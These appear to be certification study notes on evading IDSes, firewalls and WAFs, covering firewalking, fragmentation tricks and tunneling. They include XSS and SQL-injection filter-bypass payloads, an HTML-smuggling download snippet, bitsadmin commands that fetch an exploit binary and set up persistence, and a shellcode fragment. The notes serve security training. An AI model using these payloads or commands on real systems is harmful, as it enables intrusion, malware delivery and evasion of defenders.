## 1. IDS/Firewall Identification

Before evading defenses, attackers identify the presence and configuration of firewalls and IDSes.

### Port Scanning
Firewalls will often uniquely identify themselves during simple port scans:
* **ManageEngine Firewall Analyzer:** Listens on UDP ports `514` and `1514`.
* **Forcepoint NGFW:** Listens on TCP port `443` and UDP port `546`.
* **Snort:** Listens to all network interfaces by default.
* **Suricata:** Configured to inspect specific interfaces and ports.

### Firewalking
Collects information about remote networks behind firewalls using **TTL (Time to Live)** values to map ACL filters.
* Sends TCP/UDP packets into the firewall with a TTL value **one hop greater** than the targeted firewall.
* If the packet passes the gateway, the next hop prompts an ICMP **"TTL exceeded in transit"** message, helping map the network.
* **Tool:** `Firewalk` (Linux), `Nmap` firewalk script.

### Banner Grabbing
Detects the vendor and firmware version of a firewall/server via service announcements.
* **Syntax:** `<service name> <service running> <port number>`
* **Example:** `telnet mail.targetcompany.org 25`
* *A firewall does not block banner grabbing because the connection appears legitimate.* (Example error showing server version: `HTTP/1.1 400 Bad Request ... Server: Apache`).

## 2. Packet and Routing Evasion Techniques

### IP Address Spoofing
Masquerading as a trusted source by altering the source IP address in packet headers. 
* **Tool:** `Hping`
* **Example:** Host A sends malicious packets to Host B, but modifies the source IP to match Host C (a trusted source). Host B accepts the packets, bypassing the firewall.

### Source Routing
The sender designates the exact route the packet takes through the network to avoid well-secured segments where IDSes/firewalls are installed.
* **Loose source routing:** Sender specifies *one or more* stages.
* **Strict source routing:** Sender specifies the *exact* route.

### Tiny Fragments
Attackers create tiny fragments of outgoing packets, forcing the TCP header information to split into the next fragment.
* IDS fails to reassemble the stream effectively.
* Firewalls that only check the TCP header of the first fragment will allow the remaining fragments to pass through.

## 3. Web, Proxy, and VPN Evasion

### Bypass Blocked Sites Using IP Address
Type the blocked website's IP address directly in the browser instead of the domain name. Use services like **Host2ip** to find the IP.

### Anonymous Website Surfing Sites
Unblocks restricted sites by hiding the actual IP address behind a proxy.
* **Anonymize VPN** ([https://anonymize.com](https://anonymize.com)): Routes traffic through an encrypted tunnel.
* **Other Anonymizers:** `https://2ip.io/anonim`, `https://www.kproxy.com`, `https://zendproxy.com`, `https://proxify.com`, `https://www.proxysite.com`, `http://anonymouse.org`, `https://proxyscrape.com`.

### Using a Proxy Server (Windows Setup)
1. Control Panel → Network and Internet → Internet Options.
2. Connections tab → "LAN settings".
3. Check "Use a proxy server for your LAN".
4. Type IP and Port (default `8080`).

## 4. Tunneling Techniques

### ICMP Tunneling
Allows tunneling of a backdoor shell in the data portion of ICMP Echo packets.
* **RFC 792** (ICMP) does not define what should go in the data portion, so firewalls often ignore the arbitrary payload.
* **Tool:** `ICMPTX` ([https://codeberg.org](https://codeberg.org)) executes commands inside ICMP echo payloads.

### ACK Tunneling
Firewalls do not filter ACK packets as rigorously as SYN packets (which initiate connections).
* Attackers use **Hping** or **Nping** to craft ACK packets with malicious payloads and send them using an *existing* session.

### HTTP Tunneling
Encapsulates data inside HTTP traffic via **port 80**. IDS rarely examines the payload of every HTTP packet.
* **Tools:** `Chisel` ([https://github.com](https://github.com)), `HTTPort`, `HTTHost`, `Tunna`.
* **Using HTTPort & HTTHost:**
  1. Disable IIS on the attacker's system.
  2. Run `HTTHost`, listen on port `90` (`Listener: listening at <IP>:90`).
  3. Block outbound port `21` via Windows Defender.
  4. Run `HTTPort`, go to Proxy tab, enter HTTHost IP and port `90`.
  5. Go to Port Mapping tab, add mapping for local port 21 to remote port 21.
  6. Click Start, then run `ftp 127.0.0.1` in the command prompt.

### SSH Tunneling
Sends unencrypted traffic through an encrypted SSH tunnel to port 80 on the remote server.
* **OpenSSH Example:** `ssh -f user@certifiedhacker.com -L 5000:certifiedhacker.com:25 -N`
* **Bitvise SSH Client** ([https://www.bitvise.com](https://www.bitvise.com)):
  * **Local Port Forwarding:** Redirects local port to a remote port. (Listen Interface `127.0.0.1`, access via `http://localhost:8080`).
  * **Remote Port Forwarding:** Exposes local service to remote network. (Listen Interface `0.0.0.0`).
  * **Dynamic Port Forwarding:** Creates a SOCKS proxy. (Listen Interface `127.0.0.1`, browser configured to `localhost:1080`).

### DNS Tunneling
Embeds malicious data within DNS queries and responses (UDP port 53), which are limited to 255 bytes and alphanumeric/hyphen characters.
* DNSSEC cannot detect this because the data is embedded in legitimate traffic.
* **Tools:** `dnscat2`, `iodine` ([https://code.kryo.se](https://code.kryo.se)).
  * `iodined` (server) responds to queries and decodes data.
  * `iodine` (client) intercepts outgoing traffic and encodes it into queries.

## 5. Bypassing using External Systems & Content

### External Systems
Bypassing perimeter defenses by compromising an external system that has internal access (e.g., employee home machine).
1. Attacker sniffs session ID/cookies.
2. Attacker gets the Windows ID of the running Mozilla process.
3. Issues an `OpenURL()` command to redirect the browser to the attacker's server.

### MITM Attacks (DNS Poisoning)
1. Corrupts DNS cache with false information.
2. Corporate DNS sends attacker's IP (e.g. `127.22.16.64`).
3. Attacker tunnels HTTP traffic to the real host, making it appear legitimate.

### Content Evasion (Steganography/Obfuscation)
Embedding Trojans/malware within legitimate file formats. 
* Common formats used: `EXE, COM, BAT, PS, PDF CDR, DVB, DWG, SMM, DOC, DOT, CNV, ASD, XLS, XLB, XLT, ADP, MDA, MDB, MDE, MDN, MDZ, VSD, MPP, MPT, PPT, PPS, POT, MSG, OTM`.

## 6. Bypassing WAF using XSS and HTTP Attacks

Web Application Firewalls (WAF) filter things like single quotes and magic quotes. Attackers bypass them using formatting tricks.

### Using ASCII Values
* **Payload:** `<script>alert("XSS")</script>`
* **Bypass:** `<script>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41)</script>`
* Can be generated via the **Hackbar Mozilla addon**.

### Using Hex Encoding
* **Converter:** `http://www.convertstring.com/EncodeDecode/HexEncode`
* **Bypass:** `%3C%73%63%69%72%70%74%3E%61%6C%65%72%74%28%22%58%53%53%22%29%3C%2F%73%6 3%72%69%70%74%3E`

### Using Obfuscation
* **Bypass:** `<sCRiPt>aLeRT("XSS")</sCriPT>`

### Using HTTP Header Spoofing
Appending fake headers (using **Burp Suite**) to trick the WAF into thinking the request originated internally:
* `X-Originating-IP: 127.0.0.1`
* `X-Forwarded-For: 127.0.0.1`
* `X-Remote-IP: 127.0.0.1`
* `X-Remote-Addr: 127.0.0.1`

### Using Blacklist Detection
Fingerprinting the WAF to find blacklisted words (e.g., `and`, `or`, `union`, `limit`) and using alternatives.
* **Blocked:** `union select username, pwd from employees`
* **Bypass:** `1 || (select username, pwd from employees where userID = 1001) = 'admin'`
* **Blocked:** `1 || (select username from employees limit 1) = 'admin'`
* **Bypass:** `1 || (select username from employees group by userID having userID = 1001) = 'admin'`

### Using Fuzzing / Brute-Forcing
Testing the WAF with massive wordlists to find evasion payloads using random user-agents and proxy chains.
* **Wordlists:** **Assetnote** ([https://wordlists.assetnote.io](https://wordlists.assetnote.io)), **SecLists** ([https://github.com](https://github.com)).

### Abusing SSL/TLS Ciphers
Finding ciphers supported by the target web server but *not* supported by the WAF.
* **Tools:** `sslscan2`, `abuse-ssl-bypass-waf.py` ([https://github.com](https://github.com)), `curl` ([https://curl.se](https://curl.se)).

## 7. HTML Smuggling

Injecting malicious code into an HTML script (HTML5/JavaScript) to hide from SIEMs, firewalls, and proxies.
* The attacker creates a JavaScript-based **Blob** with a compatible MIME that automatically downloads the malware when a link is clicked.
* **Tool:** `HTML Smuggler`

**JavaScript Example:**
```javascript
var fakeBlob = new Blob([myfakeFile], {type: 'octet/stream'});
var myfileUrl = window.URL.createObjectURL(fakeBlob);
myAnchor.href = myfileUrl; 
myAnchor.click();
```

**Signs of HTML Smuggling:**
* A ZIP file with JavaScript.
* An encrypted attachment.
* Suspicious script code within an HTML file.
* Decoding of HTML-based files using **Base64**.

**Countermeasures:**
* Block auto-execution of `.js` and `.jse` files.
* Ensure Office 365 email security blocks auto-downloads.
* Use **Microsoft Defender SmartScreen**.
* Implement **CSP headers** on the web server.
* Encode all dynamic content.

## 8. Evading IDS/Firewall through Windows BITS

Background Intelligent Transfer Service (**BITS**) distributes automatic Windows updates. It transfers files asynchronously, bypassing firewalls as a trusted system process.

### Downloading the Malicious Binary
Using the `bitsadmin` command-line interface:
```bash
bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe
```

### Creating Persistence
BITS can create specific schedule tasks that run at a system level:
```bash
/create persistence 
/addfile persistence <Malicious URL> <Local Path> 
/SetNotifyCmdLine persistence <Local Path> NULL 
/resume persistence
```

**Countermeasures:**
* Use **BitsParser** to evaluate BITS activity.
* Use Group Policy Objects (**GPO**) to manage BITS settings (limit maximum job age).

## 9. Other Techniques for IDS Evasion

### Insertion Attack
The attacker forces the IDS to read invalid packets that the end system rejects. By obscuring extra traffic, the IDS gets confused.
* **Example:** Exploiting a CGI vulnerability looking for `phf`. The attacker sends `phoneyf` by inserting `oney`. The IDS reads it harmlessly, but the end system processes it as an attack.

### Evasion Attack
The attacker exploits the host computer by sending parts of requests in packets that the IDS mistakenly *rejects*, while the host *accepts* them.

### Denial-of-Service Attack (DoS)
Overloading the IDS network processing operations (CPU cycles, memory, disk logs) to compel the IDS to spend all its time executing useless work or running out of storage.

### Obfuscating
Encoding the attack payload so only the destination host can decode it.
* **Unicode:** IIS web servers decode characters differently than the IDS. (`/` = `%u2215`, `e` = `%u00e9`). Backslashes `\` represent `5C`, `C19C`, and `E0819C`.
* **Polymorphic Code:** Unique attack patterns.
* **Digital Steganography.**

### False Positive Generation
Creating a significant amount of alert data/log noise to hide real attacks within a massive volume of fake alerts.

### Session Splicing
Splitting traffic into an excessive number of tiny packets and adding delays.
* Evades IDS that do not reconstruct sessions before pattern-matching.
* If the delay exceeds the IDS reassembly timeout, the IDS drops the session while the host accepts it.
* **Tool:** `Nessus`.

### Fragmentation Attack
Exploiting varying Maximum Transmission Unit (MTU) fragmentation timeouts between the IDS and the host.
* **Attack Scenario 1:** If IDS timeout is 10s and Victim is 20s, attacker delays 15s. IDS drops, victim reassembles.
* **Attack Scenario 2:** Sending fake payloads first, allowing IDS to timeout and compute an invalid checksum while the victim reassembles the valid stream.

### Time-To-Live Attacks
If a router exists between the IDS and the victim, attackers send fragments with a TTL of `1`. The IDS sees the packet, but the router drops it before it reaches the victim. 
* Attackers guess router hops using `traceroute`.

### Urgency Flag
Setting the TCP **URG** flag and an Urgent Pointer field. The IDS reads all garbage data before the pointer, while the victim ignores it, causing desynchronization.

### Invalid RST Packets
Sending RST packets with an **invalid checksum**. The IDS stops processing the stream thinking it ended, but the victim drops the invalid RST and continues the session.

### Polymorphic Shellcode
Encrypting shellcode with unknown algorithms and prepending a decoder. The payload is rewritten each time it is sent, making signatures unusable. 

### ASCII Shellcode
Writing shellcode entirely using ASCII standard characters to bypass character restrictions.
* **Example (Executes `/bin/sh`):**
  `"LLLLYhb0pLX5b0pLHSSPPWQPPaPWSUTBRDJfh5tDS..."`

### Application-Layer Attacks
Exploiting compressed data (images, video) and integer overflow vulnerabilities. IDS cannot read the compressed payload.

### Desynchronization
* **Pre-Connection SYN:** Sending an initial SYN with an invalid TCP checksum before the real connection.
* **Post-Connection SYN:** Sending a SYN packet with divergent sequence numbers in an already established data stream.

### Domain Generation Algorithms (DGA)
Used to generate numerous random domain names for Command and Control (C2) communication. Uses a shared **seed**.
* **Character-based DGAs:** Random strings (`ab5cde8.com`).
* **PRNG DGAs:** Uses system date/time to generate mapped letters (`837291056` -> `hbeajidfg.com`).
* **Dictionary-based DGAs:** Readable domains (`applebanana.com`).
* **High-collision DGAs:** Mimics real domains (`test.com`).

### Encryption and Flooding
Using secure SSH/SSL/VPN tunnels to blind the IDS, or flooding IDS resources with fake traffic to exhaust them.
